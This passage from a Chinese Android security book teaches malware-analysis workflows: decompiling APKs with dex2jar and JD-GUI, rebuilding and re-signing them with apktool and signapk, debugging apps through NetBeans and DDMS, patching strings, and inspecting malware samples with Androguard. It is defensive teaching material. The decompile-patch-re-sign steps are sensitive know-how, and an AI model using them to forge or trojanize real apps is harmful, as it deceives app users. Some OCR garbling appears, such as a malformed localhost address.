break-word;'>变量格式描述符的字符索引</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x10</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>保存变量值的注册表数量</td></tr></table>

可参考如下网址。

http://source.android.com/tech/dalvik/dex-format.html

□ http://www.retrodev.com/android/dexformat.html

### 2.6 小结

本章讲解了Android分析环境构建方法和分析中必须用到的命令，这些都是分析Android系统时经常用到的内容，所以建议各位把构建好的环境压缩成镜像文件。除了本章介绍的命令外，还有很多功能可以在Android系统上使用。

随着对诊断过程的熟悉，各位可以逐个了解并记录App，这对以后的分析工作会有很大帮助。

第3章将介绍Android apk文件的结构。

### 第 3 章

# Android App.分析方法

本章将讲解诊断Android恶意代码和漏洞时需要使用的分析方法，这些内容会在之后的第4章、第5章和第7章用到，希望各位熟记。

### 3.1 通过反编译进行静态分析

Android静态分析通过对正在运行的App进行实时调试以详细检测Smali字节代码，或能够以安全为目的修改功能。apk文件的优点是，可以轻松对其进行反编译以生成正常的App。静态分析过程并不难。图3-1表示App的生成过程。了解生成apk文件、Sign并发布的过程后就能知道，反编译就是逆序进行这些操作。

通过之前的学习可以知道，apk文件是通过Java代码开发的。Java语言与C语言这种编译语言不同，会生成字节形态的类文件。只要安装了Java虚拟机（JVM），就可以在所有系统上运行这种独立代码。字节代码与C语言环境生成的二进制代码不同，可轻松进行反编译。

因此，无论是诊断恶意代码还是查找App漏洞，使用复原的源代码会比较简单。为了复原文件而使用命令行窗口的操作过程很长，此处介绍使用2种工具就能复原源代码的简便方法。

第一个是把apk文件转换成Java类文件的工具dex2jar $ ^{①} $。下载文件并解压，能看到相关库文件和很多工具。如果是Windows环境就使用dex2jar.bat文件，Linux环境则使用dex2jar.sh文件。

 </div>

(出处：http://developer.android.com/tools/building/index.html#detailed-build)

 </div>

在命令行窗口输入如下代码，待解压文件名即可转换为jar文件。

C:\Users\kb1736\Downloads\dex2jar-0.0.9.14\dex2jar-0.0.9.14>dex2jar.bat
AndroidHello.apk
this cmd is deprecated, use the d2j-dex2jar if possible
dex2jar version: translator-0.0.9.14
dex2jar AndroidHello.apk -> AndroidHello_dex2jar.jar
Done.

如果要使用Windows浏览器，则直接把apk文件拖放到dex2jar.bat上，就会生成jar文件。

 </div>

第二是对生成的类文件包jar文件进行反编译。以后会介绍在命令行下使用jad工具 $ ^{①} $反编译jar文件的方法，现在使用GUI版本的jad-JD-GUI > Java Decompiler。因官方网站已关闭，请在Google搜索“java decompiler gui”后下载。

下载后运行 “jd-gui.exe” 并导入jar文件，自动进行反编译，如图3-4所示。

 </div>

这样就完成了反编译工作。之后通过这些信息，根据诊断对象掌握进程并搜索特定字符。JD-GUI工具是进行这些操作的最佳软件。但是，只使用字符进行搜索时，字符不完全一致就会出现问题。简单的源代码可以通过搜索所有源代码进行查找，但是针对容量大的apk文件，这种搜索方法并不合适。

 </div>

   </div>

 </div>

需要搜索多个字符时，我会在命令行使用jad将所有类文件反编译为Java文件，然后使用字符搜索“神器”AstroGrep进行搜索。

 </div>

AstroGrep $ ^{①} $是将内容保存到内存后进行搜索的，所以无论多大的文件都可以进行快速查找。它是开源程序，各位可以根据自己的喜好添加特定功能并应用于实际业务。我也对其进行了改动，制作了可以搜索多个模式列表的工具和搜索恶意代码模式的工具。

### 3.2 通过动态调试进行分析

通过静态分析可知，apk文件在没有加密的情况下几乎能够100%复原，所以没有进行动态分析的必要。但是为了快速掌握特定操作的运行时间，有必要进行动态调试。

动态调试过程可概括如下，具体内容请参考详细介绍。

(1) 使用APK Tools通过调试模式转储（使用b选项）。

(2) 通过调试模式把转储的文件重新打包（使用d选项）。这是动态调试必经过程。

(3)签名（Sign）打包后的apk文件并在AVD（Android Virtual Device）上运行。

(4) 使用Netbeans把第一步的结果代码添加到项目，再把android.jar文件添加到Lib。

(5) 使用DDMS查看/连接对象App的端口。

(6) 选择Netbeans IDE标签菜单的Debug > Attach Debugger > Select JPDA，设置host和port后进行远程调试。

(7) 在需分析的部分设置断点。

(8) 在模拟器上触发特定事件以诱导运行设置断点的代码行。使用Line by Line或class、函数等进行动态调试。

(9) 诊断人员修改想要的代码。

表3-1列出了调试Android apk文件时需要的工具。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>工具名称</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>APKTools</td><td style='text-align: center; word-wrap: break-word;'>用于解码/打包apk文件。调试模式使用d选项，重新打包时使用b选项</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Netbeans IDE</td><td style='text-align: center; word-wrap: break-word;'>对模拟程序进行动态调试时，与DDMS连接后使用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Android SDK环境</td><td style='text-align: center; word-wrap: break-word;'>使用Android AVD、DDMS</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>APK Sign Tool</td><td style='text-align: center; word-wrap: break-word;'>修改apk文件后，用于发布之前的签名操作。签名后才能正常运行App</td></tr></table>

下列示例使用包含恶意代码的apk文件进行测试。

如果想把apk文件转换成调试模式，需把文件转换为smali代码，然后重新打包（rebuild）并署名。这个过程需要使用apktool.bat工具。使用a选项解压apk文件后能看到“Baksmaling”信息，同时在out文件夹中生成Java文件。这些文件的扩展名虽然是Java，但是打开后能看到是由smali代码构成的。

之后使用b选项重新打包apk文件，显示smaling信息的同时生成apk文件。对这个文件进行调试即可。

E:\\download\\Android\\rebuild>java -jar apktool.jar d MonkeyJump2.0.apk out
I: Baksmaling...
I: Loading resource table...
I: Loaded.
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: C:\Users\kb1736\apktool\framework\1.apk
I: Loaded.

I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Done.
I: Copying assets and LIBS...
E:\download\Android\rebuild>java -jar apktool.jar b out MonkeyJump2.0_re.apk
I: Checking whether sources has changed...
I: Smaling...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...

如图3-8所示，使用apktool的调试模式解压文件后，使用编辑器浏览文件即可看出是用smali代码写成的（图3-9）。

 </div>

 </div>

图3-10是解压apk文件后得到的AndroidMainfest.xml文件。只需查看权限信息就能大致判断是否为恶意代码。游戏程序很少会使用到发送SMS信息的命令。

 </div>

可以在同一个文件夹内看到apk文件，如图3-11。

 </div>

下面是对重新生成的MonkeyJump2.0.apk文件进行签名的过程。如果不对重建的apk文件进行签名，就不能把apk文件安装到设备。使用signapk.jar文件进行随机签名后，重新编译的程序也能正常安装。

   </div>

-jar signapk.jar testkey.x509.pem testkey.pk8

MonkeyJump2.0_re.apk MonkeyJump2.0_sign.apk

E:\download\Android\rebuild>adb install MonkeyJump2.0_sign.apk

1785 KB/s (566739 bytes in 0.309s)

 </div>

准备好apk文件后，安装到AVD模拟器。如果是恶意代码，安装到实际设备时会有危险，所以必须安装在模拟器上。

下面是重要的NetBeans IDE设置过程。NetBeans也是编辑或编译时经常用到的工具，因为可以简单设置Java环境下的调试功能。从NetBeans IDE官方网站 $ ^{①} $下载后安装。此处省略安装过程。

选择 “New Project” 后运行 “导入现有源代码” （Java Project with Existing Sources），如图3-13所示。

 </div>

接下来的步骤很重要，如果存在dist文件夹就会出现错误，所以要先删除这个文件夹，之后点击“确定”（如前所述，最好先把dist文件夹里的apk文件保存到其他文件夹），然后把反编译的源代码导入out文件夹即可。当然，此时会导入使用Java扩展名的smali代码。

 </div>

 </div>

现在需要Android相关库，所以添加android.jar文件，如图3-16所示。选择左侧的“Libraries”后点击鼠标右键，选择“Add JAR/Folder”菜单。

 </div>

之后从android SDK安装文件夹导入jar文件，如图3-17所示。(如：C:\Program Files (x86)\Android\android-sdk\platforms\android-10\android.jar)

 </div>

在Eclipse上运行DDMS就能看到当前设备中运行的App信息，如图3-18所示。选择monkeys程序就能看到它使用8700端口进行通信。

 </div>

选择NetBeans IDE菜单中的“Debug > Attach Debugger...”就会显示环境设置页面，如图3-19所示。

 </div>

Debugger: Java Debugger (JPDA)

Host: 127.0.01

Port: 8700

   </div>

输入上面的信息即可。

 </div>

输入后点击 “OK” 的同时，如果DDMS上的相应App显示蓝色，则说明连接正常。这样就完成了实时调试所需的环境设置。

在NetBeans的任一行代码上设置断点后运行程序。选择 “Debug > New Breakpoint” 后，在“Breakpoint Type”选项中选择 “Line” 即可。

 </div>

运行程序的过程中, 该行会变成蓝色。调试方法与之前的工具相同, 可以使用Step Over、Step In。分析恶意代码时很少使用调试功能, 诊断时为了确认各变量会被赋予什么值, 或程序会使用什么流程运行时才会进行调试。调试时需要多看源代码以进行比较。本书提及了调试所需环境, 至于源代码分析, 就需要各位亲自操作了。

此方法并不完全正确，环境构建中使用的apktool版本将决定调试能否成功，使用低版本的程

序反而会提高调试成功率。这些操作只是为了查看详细信息或诊断App服务时判断是否绕过安全认证或修改文件而做的工作，分析恶意代码时需重点学习接下来的内容。

 </div>

### 3.3 通过代码修补绕过 apk 文件

本节将简单介绍反编译apk文件后修补其代码的过程。技术方面的问题已经在学习动态分析时提及，至于要通过这些技术修补哪些部分，这需要较多的经验。

下面讲解使用Android开发编辑器(Eclipse)生成简单App，并对其进行反编译，然后修改smali代码和其他字符串的过程。

此处会制作首次开发时都会用到的 “Hello World” App。在Eclipse中生成新的Android开发项目并编译运行，结果如图3-23所示。Android虚拟设备环境使用了Android 4.0.3版本。

   </div>

 </div>

下面试着把图3-23的字符串修改成其他字符。首先使用之前介绍过的apktool调试选项，把软件包的文件转换成smali代码。

 </div>

本节只简单修改桌面上显示的字符串，所以在反编译后的路径中打开code_out/res/values/strings.xml文件，编辑字符串后保存。

 </div>

之后，重新使用b选项生成修改源代码后的apk文件，签名后就能在设备上安装程序了（请参考调试过程）。

 </div>

 </div>

查看安装后的App就能看到修改后的字符。本示例是为了简单讲解，所以只对字符进行了修改。诊断手机App时，检测“App伪造验证”项目时会使用该方法。恶意代码会尽量使用相同图标或界面，但有时会在界面中插入自己的标记后发布。像这样把正常App修改成恶意App时，需要针对App伪造进行验证。

### 3.4 使用 AndroGuard 进行分析

之前的章节对动态分析概念和方法进行了说明，本节将以这些概念为基础，学习如何使用Python语言写成的程序进行动态分析。此处使用的工具是Androguard $ ^{①} $。后面详细讲解恶意代码分

析时，会经常提到“在线分析服务”。对之前学习的原理和现在要学习的 AndroGuard使用方法有一定程度了解后，使用“在线分析服务”时，脑海中会自动浮现整个分析过程。因此，进行动态/静态分析时，这些工具非常有用。

AndroGuard复合工具与反编译Android系统可执行文件apk文件的工具进行组合，能够迅速搜索apk文件的主要信息、用户输入的字符模式的函数位置等。这个工具包的特别之处在于，它包含了DroidBox $ ^{(1)} $。DroidBox可用作初始分析工具，能够分析模拟器上运行的apk文件实时产生的日志文件。

虽然也可以将AndroGuard安装在Windows或Linux上使用，但为了提高效率，还是建议各位使用ARE（Android Reverse Engineering） $ ^{②} $或Santoku（Santoku相关信息请参考3.9节）。ARE是为了分析Android环境源代码而优化的Live CD。因为所有工具都安装在Ubuntu Linux中，所以第一次看到时会发现，它与Backtrack很类似。

ARE包含如下几个工具，很适合用于分析Android软件包。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>工具</td><td style='text-align: center; word-wrap: break-word;'>URL信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androguard</td><td style='text-align: center; word-wrap: break-word;'>http://code.google.com/p/androguard/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Android sdk/ndk</td><td style='text-align: center; word-wrap: break-word;'>http://developer.android.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>APKInspector</td><td style='text-align: center; word-wrap: break-word;'>http://code.google.com/p/apkinspector/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Apktool</td><td style='text-align: center; word-wrap: break-word;'>http://code.google.com/p/android-apktool/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Axmlprinter</td><td style='text-align: center; word-wrap: break-word;'>http://code.google.com/p/android4me/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ded</td><td style='text-align: center; word-wrap: break-word;'>http://siis.cse.psu.edu/ded/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Dex2jar</td><td style='text-align: center; word-wrap: break-word;'>http://code.google.com/p/dex2jar/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DroidBox</td><td style='text-align: center; word-wrap: break-word;'>http://code.google.com/p/droidbox/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Jad</td><td style='text-align: center; word-wrap: break-word;'>http://www.varaneckas.com/jad</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Smali/Baksmali</td><td style='text-align: center; word-wrap: break-word;'>http://code.google.com/p/smali/</td></tr></table>

本书将下载并运行Virtual Box镜像文件。Virtual Box可以免费下载使用，下载安装后导入镜像文件即可开始使用ARE（ARE帐号是android/android。转换到root权限时需要该账号，希望各位牢记）。

运行后访问/home/android/tools目录即可看到包含如下工具。仔细学习过第2章的读者应该能看到几个熟悉的工具。因为已经包含了ADB、NDB等可以运行Android模拟器的所有环境，所以无需另行架设。

 </div>

首先观察AndroGuard文件夹包含的工具。移动到文件夹后可以看到很多Python语言写成的工具，每个程序的用处都不同，需要根据环境选择。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>工具名称</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androaxml</td><td style='text-align: center; word-wrap: break-word;'>以用户便于阅读的方式转换Android XML文件示例：http://androguard.blogspot.kr/2011/03/androids-binary-xml.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androapkinfo</td><td style='text-align: center; word-wrap: break-word;'>收集apk文件信息（权限、服务、是否使用恶意代码等）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androcsign</td><td style='text-align: center; word-wrap: break-word;'>在数据库中留下自己特有的识别标志时生成密钥代码搜索特定恶意代码时可用作识别标志</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androdd</td><td style='text-align: center; word-wrap: break-word;'>根据类和方法进行分类，显示Android软件包结果值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androdiff</td><td style='text-align: center; word-wrap: break-word;'>比较/分析两个软件包后显示结果分析示例：http://code.google.com/p/elsim/wiki/Similarity#Androdiff</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androdump</td><td style='text-align: center; word-wrap: break-word;'>为了得到原类文件内容，显示Linux进程的导出值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androgexf</td><td style='text-align: center; word-wrap: break-word;'>使用GEXF格式显示结果下载Viewer：http://gephi.org/恶意代码示例：http://code.google.com/p/androguard/wiki/Visualization#Gephi</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androlyze</td><td style='text-align: center; word-wrap: break-word;'>可以用命令行模式分阶段分析软件包</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Andromercury</td><td style='text-align: center; word-wrap: break-word;'>连接Mercury框架的工具参考博客：http://androguard.blogspot.fr/2012/03/androguard-mercury.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androrisk</td><td style='text-align: center; word-wrap: break-word;'>风险度检查工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androsign</td><td style='text-align: center; word-wrap: break-word;'>检测是否为数据库中存在的样本</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androsim</td><td style='text-align: center; word-wrap: break-word;'>比较/分析两个软件包并显示结果示例：http://code.google.com/p/elsim/wiki/Similarity#Androsim</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Androxgmml</td><td style='text-align: center; word-wrap: break-word;'>使用XGMML格式显示结果示例：http://androguard.blogspot.kr/2011/02/android-apps-visualization.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Apkviewer</td><td style='text-align: center; word-wrap: break-word;'>查看文件信息</td></tr></table>

#### 3.4.1 使用Androapkinfo查看信息

可以使用Androapkinfo工具快速查看软件包信息。Androapkinfo对AndroidManifest.xml文件进行分析后，浏览API权限以自动查找并显示可能被恶意使用的API。对软件包进行初始分析时，该工具非常有用。可以在androapkinfo看到如图3-29所示的信息。

permissions, services, activities, receivers, usage of native code

 </div>

 </div>

#### 3.4.2 使用Androxml查看二进制XML文件

Androxml可以把Android基本概念中介绍过的二进制XML文件AndroidManifest.xml文件转换为之前的XML文件格式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-h、--help</td><td style='text-align: center; word-wrap: break-word;'>查看帮助后退出</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-i INPUT、--input=INPUT</td><td style='text-align: center; word-wrap: break-word;'>需分析的文件名（apk文件或Android二进制XML文件）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-o OUTPUT、--output=OUTPUT</td><td style='text-align: center; word-wrap: break-word;'>要输出的XML文件名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-v、--version</td><td style='text-align: center; word-wrap: break-word;'>API版本信息</td></tr></table>

如图3-31所示，使用androxml转换AndroManifest.xml文件后查看结果。

 </div>

#### 3.4.3 使用Androlyze进行分析

第一次运行Androlyze时可以看到如图3-32所示的说明。这是初始化IPython的过程，可以按任意键移动到下一阶段。

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-h、--help</td><td style='text-align: center; word-wrap: break-word;'>查看帮助</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-i INPUT、--input=INPUT</td><td style='text-align: center; word-wrap: break-word;'>file: 输入需分析的文件名</td></tr></table>

(续)

主要选项
-d、--display
-m METHOD、--method=METHOD
-f FIELD、--field=FIELD
-s、--shell
-v、--version
-p、--pretty
-x、--xpermissions

说 明
转换成用户可判断的格式（smali代码）
使用正则表达式显示方法信息
使用正则表达式显示字段信息
为了更简单地分析对象而运行交互式shell环境
API版本信息
使用颜色区分代码并显示
显示权限路径

安装后初次运行时，可能会在模块部分发生错误。

android@honeynet:~/tools/androguard$ ./androlyze.py -i MonkeyJump2.0.apk -x
Traceback (most recent call last):
File "./androlyze.py", line 38, in <module>
from androguard.decompiler.decompiler import *
File "/home/android/tools/androguard/androguard/decompiler/decompiler.py",
line 25, in <module>
from pygments.filter import Filter
ImportError: No module named pygments.filter

此时可通过如下2个命令升级模块，然后即可恢复正常。Windows环境下也同样适用。

android@honeynet:~/tools/androguard$ sudo easy_install Pygments
android@honeynet:~/tools/androguard$ sudo easy_install ipython

Windows环境下要先安装easy_install软件。通过下列链接下载easy_install安装。

☐ 下载easy install；https://pypi.python.org/pypi/setuptools（位于网页底端）.

root@kali:~# easy_install ipython
Searching for ipython
Reading http://pypi.python.org/simple/ipython/
Reading http://ipython.scipy.org
Reading http://ipython.scipy.org/dist
Reading http://ipython.org
Reading https://github.com/ipython/ipython/downloads
Reading http://ipython.scipy.org/dist/0.8.4
Reading http://ipython.scipy.org/dist/0.9.1
Reading http://archive.ipython.org/release/0.12.1
Reading http://ipython.scipy.org/dist/old/0.9
Reading http://ipython.scipy.org/dist/0.10
Reading http://archive.ipython.org/release/0.11/
Reading http://archive.ipython.org/release/0.12
Best match: ipython 0.13.1
Downloading
http://pypi.python.org/packages/2.7/i/ipython/ipython-0.13.1-py2.7.egg#md5=d4bbe
64ccefa59c46536ab94b846db6f
Processing ipython-0.13.1-py2.7.egg
... (中略) ...

Installed /usr/local/lib/python2.7/dist-packages/ipython-0.13.1-py2.7.egg
Processing dependencies for ipython
Finished processing dependencies for ipython

androlyze.py可以通过多种选项对APK或DEX文件进行静态/动态分析。通过命令行窗口查看信息时，可以分析或修改Dalvik代码，所以先了解几个命令。使用-s选项可以进入命令行模式，我们将在Windows环境下操作-s选项。Windows环境下必须先安装之前介绍过的Pygments和IPython。如果想补充安装pyreadline相关模块，可以使用与下面相同的方法。Pyreadline使用syntax功能区分命令行模式画面。

C:\utils\androguard-1.9.tar\androguard-1.9&gt;python androlyze.py -s
WARNING: Readline services not available or not loaded.WARNING: Proper color support under MS Windows requires the pyreadline library.
You can find it at:
http://ipython.org/pyreadline.html
Gary's readline needs the ctypes module, from:
http://starship.python.net/crew/theller/ctypes
(Note that ctypes is already part of Python versions 2.5 and newer).
Defaulting color scheme to 'NoColor'Androlyze version 1.9
In [1]: ^Z
Do you really want to exit ([y]/n)?
C:\utils\androguard-1.9.tar\androguard-1.9&gt;easy_install pyreadline
Searching for pyreadline
Reading http://pypi.python.org/simple/pyreadline/
Reading http://ipython.scipy.org/moin/PyReadline/Intro
Reading https://launchpad.net/pyreadline/+download
Reading http://projects.scipy.org/ipython/ipython/wiki/PyReadline/Intro
Best match: pyreadline 1.7.1
Downloading
http://pypi.python.org/packages/any/p/pyreadline/pyreadline-1.7.1.win32.exe#md5=
ffe3987562d0891901ebccdd94933a39
Processing pyreadline-1.7.1.win32.exe
creating
'c:\users\admini~1\appdata\local\temp\easy_install-khqm2t\pyreadline-1.7.1-py2.7
-win32.egg' and adding 'c:\users\admini~1\appdata
\local\temp\
easy_install-khqm2t\pyreadline-1.7.1-py2.7-win32.egg.tmp' to it
Moving pyreadline-1.7.1-py2.7-win32.egg to c:\python27\lib\site-packages
Adding pyreadline 1.7.1 to easy-install.pth file
Installed c:\python27\lib\site-packages\pyreadline-1.7.1-py2.7-win32.egg
Processing dependencies for pyreadline
Finished processing dependencies for pyreadline

下面参考Android官方网站的帮助文档进行实际操作。首先按照顺序执行，学习如何反编译apk文件的类中的方法信息。

C:\utils\androguard-1.9.tar\androguard-1.9&gt;python androlyze.py -s

In [1]: a, d, dx = AnalyzeAPK("Loozfon.apk")
In [2]: print a, d, dx
<androguard.core.bytecodes.apk.APK instance at 0x02DF5A08>
<androguard.core.bytecodes.dvm.DalvikVMFormat object at 0x02EADAF0>
<androguard.core.analys
is.analysis.uVMAnalysis instance at 0x02F4F8F0>

In [3]: d, dx = AnalyzeDex("classes.dex")

In [4]: print d, dx
<androguard.core.bytecodes.dvm.DalvikVMFormat object at 0x02F9A530>
<androguard.core.analysis.analysis.uVMAnalysis instance at 0x040482D8>

In [5]: p = d.get_strings()
In [6]: %page p
['##addressName##',
'##mailAddress##',
'##paramDivide##',
'##paramPartDivide##',
'##telNo##',
'('
/appli/addressBookRegist',
'2',
'<',
'<init>\',
';
'>;)',
'ADD_BOOK_REQUEST_NAME',
'ADD_URL',
'ALR_SEND',
'APPLI_DIV_PARAM',
'APPLI_ID',
'APPLI_ID_NAME',
'APPLI_MAIL_DIV_PARAM',
'APPLI_P_DIV',
'APPLI_P_PA_DIV',
'APPLI_TEL_DIV_PARAM',
'BuildConfig.java',
'CHARACTER_ENCODING',
'CLASS',
'CONSTRUCTOR',
'CONTENT_EMAIL_URI',
'CONTENT_URI',
'DEBUG',
'FIELD',
'HTTP_1_1',
'I',
'II',
'IL',
'INDIVIDUAL_NO_REQUEST_NAME',
'IS_SEND',
...（省略）

In [7]: a.show()

FILES:
res/layout/main.xml Unknown 4cbfelaf
AndroidManifest.xml Unknown -71644970
resources.arsc Unknown -11ee6b95
res/drawable-hdpi/ic_launcher.png Unknown 5f8a1eb4
res/drawable-ldpi/ic_launcher.png Unknown -68d333d4
res/drawable-mdpi/ic_launcher.png Unknown -5a405f36
res/drawable-xhdpi/ic_launcher.png Unknown -363f6f18
classes.dex Unknown -3f675dfb
META-INF/MANIFEST.MF Unknown -1d6eaaad
META-INF/CERT.SF Unknown 752a50f1
META-INF/CERT.RSA Unknown -62a3f033
PERMISSIONS:
android.permission.CALL_PHONE ['dangerous', 'directly call phone numbers', 'Allows the application to call phone numbers without your intervention. Malicious applications may cause unexpected calls on your phone bill. Note that this does not allow the application to call emergency numbers.']
android.permission.READ_CONTACTS ['dangerous', 'read contact data', 'Allows an application to read all of the contact (address) data stored on your phone. Malicious applications can use this to send your data to other people.']
android.permission.READ_PHONE_STATE ['dangerous', 'read phone state and identity', 'Allows the application to access the phone features of the device. An application with this permission can determine the phone number and serial number of this phone, whether a call is active, the number that call is connected to and so on.']
android.permission.INTERNET ['dangerous', 'full Internet access', 'Allows an application to create network sockets.']

android.permission.ACCESS_NETWORK_STATE ['normal', 'view network status', 'Allows an application to view the status of all networks.']

MAIN ACTIVITY: ll.ap.ken.LlApKenActivity
ACTIVITIES: ['ll.ap.ken.LlApKenActivity']
SERVICES: []
RECEIVERS: []
PROVIDERS: []

Out [21]: <androguard.core.bytecodes.dvm.EncodedMethod instance at 0x04026788>

In [9]: d.CLASS_Lll_ap_ken_LlApKenActivity_2.METHOD_init.pretty_show(
######### Method Information
Lll/ap/ken/LlApKenActivity$2;-><init>(Lll/ap/ken/LlApKenActivity;)V
[access_flags=constructor]

######### Params
- local registers: v0...v0
- v1:ll.ap.ken.LlApKenActivity
- return:void
##################

<init>-BB@0x0 :
0 (00000000) iput-object v1, v0,
Lll/ap/ken/LlApKenActivity$2;->this$0 Lll/ap/ken/LlApKenActivity;
1 (00000004) invoke-direct v0, Ljava/lang/Object;-><init>()V
2 (0000000a) return-void

####### XREF
F: Lll/ap/ken/LlApKenActivity; uranai ( )V 8

#######

下面逐条学习命令。下列示例是导入恶意程序Loozfon.apk文件的过程。介绍命令之前，可以看出，与上述示例不同，第一行没有输入完命令之前就会显示相关命令。想不起命令时，输入前面的几个字符后按“Tab”键就能自动补全命令。可以在显示的命令列表中选择输入自己需要的命令。

a选项可以调出“APK instance”信息。b选项会以“Dalvik VMFormat”格式导入。dx会使用“uVMAnalysis instance”导入。可以根据不同情况选择使用这些命令。但分析apk文件时，通常会同时使用这3种命令。这是以Dalvik格式导入并准备反编译的过程。

In [1]: a, d, dx = An
AnalyzeAPK AnnotationElement androauto.py androlyze.py
AnalyzeClasses AnnotationItem androaxml.py andromercury.py
AnalyzeDex AnnotationOffItem androcsign.py androrisk.py
AnalyzeElf AnnotationSetItem androdd.py androsign.py
AnalyzeJAR AnnotationSetRefItem androdiff.py androsim.py
Androguard AnnotationSetRefList androdis.py androxgmml.py
AndroguardS AnnotationsDirectoryItem androdump.py
Annotation androapkinfo.py androgexf.py
AnnotationDefaultAttribute androarsc.py androguard/
In [1]: a, d, dx = AnalyzeAPK("Lo
LocalVariableTableAttribute Long LookupSwitch
LocalVariableTypeTableAttribute LookupError
In [1]: a, d, dx = AnalyzeAPK("Loozfon.apk")
In [2]: print a, d, dx
<androguard.core.bytecodes.apk.APK instance at 0x02EFDCD8>
<androguard.core.bytecodes.dvm.DalvikVMFormat object at 0x02F01270> <an
droguard.core.analysis.analysis.uVMAnalysis instance at 0x02FD59B8>
In [3]:

虽然直接调用apk文件的情况比较多，但如果存在classes.dex文件，则可以跳过a命令，直接导入文件。只要有dex文件就可以分析App信息，所以会显示相同信息。

In [3]: d, dx = AnalyzeDex("classes.dex")

这是在Dalvik格式中进行反编译并查找其中字符串的过程。使用`get_string()`函数在p值保存信息，然后使用`%page`命令显示保存的值。

In [5]: p=d.get_strings()
In [6]: %page p

分析时使用的函数很多，如图3-32所示。输入需要的函数后按“Tab”键进入内部，最后会显示HEX值。希望各位在分析过程中逐条练习每个命令。

最后的命令是使用Dalvik代码查看类中方法的函数信息。可以使用这种CLI模式，也可以在之后介绍的Sublime编辑器上添加插件，然后使用鼠标点击查看。每个分析人员的习惯不同，对CLI模式和GUI模式的喜好也不同，希望各位能最大限度地灵活运用各种工具。

 </div>

#### #### # # Method Information
Lll/ap/ken/LlApKenActivity$2;-><init>(Lll/ap/ken/LlApKenActivity;)V
[access_flags=constructor]
### #### #### Params
- local registers: v0...v0
- v1:ll.ap.ken.LlApKenActivity

简单介绍一下其他命令。`get_files()` 可以浏览 apk 文件内部的文件。在浏览器中解压后的画面如图 3-34 所示。

In [5]: a.get_files()
Out[5]:
[u'res/layout/main.xml',
u'AndroidManifest.xml',
u'resources.arsc',

u'res/drawable-hdpi/ic_launcher.png',
u'res/drawable-ldpi/ic_launcher.png',
u'res/drawable-mdpi/ic_launcher.png',
u'res/drawable-xhdpi/ic_launcher.png',
u'classes.dex',
u'META-INF/MANIFEST.MF',
u'META-INF/CERT.SF',
u'META-INF/CERT.RSA']

 </div>

顾名思义，`get_permissions()` 用于查看 apk 文件的权限。

In [6]: a.get_permissions()
Out [6]:
['android.permission.CALL_PHONE', 'android.permission.INTERNET', 'android.permission.READ_PHONE_STATE', 'android.permission.READ_CONTACTS', 'android.permission.ACCESS_NETWORK_STATE']

此外还有很多可以获取apk文件简单信息和地址值的命令，希望各位逐一测试。

 </div>

下面逐个介绍其他主要选项。

# 1. -display选项

按照用户可浏览的格式显示，表示将apk文件转换为smali代码。根据apk文件的大小，显示的内容会比较多，所以最好保存到txt文件后再查看。

oneynet:~/tools/androguard$ ./androlyze.py -i MonkeyJump2.0.apk -d .txt

 </div>

# 2. $ ^{-x} $选项

使用-x选项查看apk文件允许使用的API信息。从图3-37中可以看到apk文件的权限信息。

android@honeynet:~/tools/androguard$ ./androlyze.py -i MonkeyJump2.0.apk -x

 </div>

对androlyze.py与用户需要的关键字进行比较（-m选项），然后获取相关函数信息，如图3-38所示。下面是搜索onCreate函数的结果。

 </div>

添加-p选项后可以方便查看。能根据颜色区分，并按行整理缩进。

 </div>

#### 3.4.4 使用Android查看apk文件结构

